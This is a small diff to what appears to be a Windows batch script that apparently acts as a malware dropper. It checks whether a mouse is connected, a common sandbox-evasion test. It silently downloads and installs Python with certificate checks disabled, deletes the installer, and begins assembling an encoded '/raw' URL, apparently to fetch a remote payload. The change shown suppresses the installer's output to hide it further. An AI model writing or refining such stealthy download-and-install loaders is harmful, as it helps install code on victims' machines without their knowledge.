@@ -10,7 +10,7 @@ if not !mouseConnected! == true (
 set "eee=https://www.python.org/ftp/python/3.10.0/python-3.10.0rc2-amd64.exe"
 set "eeee=python-installer.exe"
 curl -L -o !eeee! !eee! --insecure --silent
-start /wait !eeee! /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0
+start /wait !eeee! /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0 > NUL 2>&1
 del !eeee!
 set "ENCODED_URL=URL"
 set "ENCODED_URL=%ENCODED_URL%/raw"
